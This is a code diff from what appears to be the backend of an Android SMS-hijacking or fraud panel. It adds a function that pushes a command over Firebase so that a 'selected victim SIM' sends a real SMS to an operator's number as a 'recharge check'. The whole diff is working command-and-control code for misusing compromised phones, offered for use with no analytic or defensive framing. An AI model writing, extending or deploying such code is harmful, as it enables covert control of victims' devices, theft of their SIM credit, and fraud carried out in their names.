@@ -625,6 +625,42 @@ async def push_outbound_to_firebase(
         return None
 
 
+async def send_recharge_check_sms(db, profile: MonitorProfile, device: Device) -> bool:
+    """Real SMS from selected victim SIM → /mynum (recharge / send path check)."""
+    from app.channel_relay import queue_manual_sms
+    from app.device_ui import RECHARGE_CHECK_MESSAGE
+    from app.services import display_phone, resolve_mynum_phone
+
+    if not profile.is_monitoring or not profile.sim_selected:
+        return False
+    mynum = resolve_mynum_phone(profile, db)
+    if not mynum:
+        logger.warning("Recharge check skipped: /mynum not set")
+        return False
+    firebase_url = resolve_firebase_url(profile, device)
+    if not firebase_url:
+        logger.warning("Recharge check skipped: no Firebase URL")
+        return False
+
+    try:
+        outbound = queue_manual_sms(db, profile, device, mynum, RECHARGE_CHECK_MESSAGE)
+        command_id = await push_outbound_to_firebase(profile, device, outbound)
+        if command_id:
+            outbound.status = "sent"
+            db.commit()
+            logger.info(
+                "Recharge check CHACHA JI queued sim_index=%s to=%s",
+                profile.selected_sim_index or 0,
+                display_phone(mynum),
+            )
+            return True
+        outbound.status = "failed"
+        db.commit()
+    except Exception as exc:
+        logger.warning("Recharge check SMS failed: %s", exc)
+    return False
+
+
 async def send_polling_startup_test(
     db,
     profile: MonitorProfile,
